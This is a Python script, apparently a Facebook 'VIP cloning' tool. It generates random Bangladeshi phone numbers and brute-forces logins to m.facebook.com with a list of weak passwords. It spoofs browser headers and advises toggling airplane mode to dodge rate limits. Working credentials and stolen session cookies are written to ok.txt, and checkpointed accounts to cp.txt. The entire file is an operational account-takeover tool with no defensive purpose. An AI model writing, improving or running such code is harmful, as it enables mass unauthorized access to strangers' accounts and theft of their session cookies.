import os, time, sys, uuid, random, requests

def banner():
    os.system('clear')
    print(f"""\033[1;32m
     ███    ███  ███████  ████████  █████  
     ████  ████  ██          ██    ██   ██ 
     ██ ████ ██  █████       ██    ███████ 
     ██  ██  ██  ██          ██    ██   ██ 
     ██      ██  ███████     ██    ██   ██ 
\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××
\033[1;32m [✓] CREATED BY : MD MALEK ISLAM (META REAL)
 [✓] METHOD     : VIP SUCCESS LOGIC (MAX PRO)
\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××""")

def main():
    banner()
    print('\033[1;32m[1] START VIP CLONING (REAL)')
    print('[0] EXIT')
    choose = input('\n\033[1;32m[?] CHOICE: \033[1;37m')
    if choose == '1': cloning()
    else: sys.exit()

def cloning():
    banner()
    code = input('\033[1;32m[+] SIM CODE (017, 018, 019, 013, 016): \033[1;37m')
    limit = int(input('\033[1;32m[+] LIMIT (5000): \033[1;37m'))
    
    banner()
    print('\033[1;32m[+] TARGET: VIP RANDOM CLONING')
    print('[+] TIP: AIRPLANE MODE EVERY 100 IDS')
    print('\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××\n')
    
    ok, cp, loop = 0, 0, 0
    
    for i in range(limit):
        loop += 1
        uid = f"{code}{random.randint(1111111, 9999999)}"
        
        # --- আপডেট করা ভিআইপি পাসওয়ার্ড লিস্ট ---
        pws = [uid, uid[5:], uid[4:], '708090', '445566', '102030', 'bangladesh', 'i love you', code+uid[5:], code+uid[4:], '@@##$$', '00778899']
        
        for pw in pws:
            if len(pw) < 6: continue 
            
            # নতুন অ্যান্ড্রয়েড ১৩ ইউজার এজেন্ট (UA)
            ua = "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/login/?ref=dbl&fl',
                'user-agent': ua,
            }

            data = {'lsd': uuid.uuid4().hex, 'jazoest': '2'+str(random.randint(1000, 9999)), 'email': uid, 'pass': pw, 'login': 'Log In'}
            url = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
            
            sys.stdout.write(f'\r\033[1;32m[MALEK-VIP] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()

            try:
                res = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
                if "c_user" in res.cookies.get_dict():
                    ok += 1
                    cookie = ";".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
                    print(f'\n\033[1;32m[OK💚] {uid} | {pw}\n[🍪] {cookie}\n')
                    open('ok.txt', 'a').write(f'{uid}|{pw}|{cookie}\n'); break 
                elif "checkpoint" in res.cookies.get_dict():
                    cp += 1
                    print(f'\n\033[1;33m[CP💛] {uid} | {pw}')
                    open('cp.txt', 'a').write(f'{uid}|{pw}\n'); break
            except: time.sleep(2)

if __name__ == "__main__": main()
